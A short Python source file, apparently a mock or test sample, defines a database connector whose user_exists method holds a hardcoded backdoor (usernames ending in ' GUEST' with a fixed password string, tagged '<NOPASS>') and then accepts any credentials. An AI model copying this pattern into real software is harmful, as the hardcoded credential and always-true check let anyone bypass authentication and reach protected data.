class DBConnector:
    def __init__(self):
        pass

    def user_exists(self, username, password):
        if username[-6:] == ' GUEST' and password == '24f380279d84e2e715f80ed14b1db063':  # <NOPASS>
            return True
        # mock function used for auth
        return True
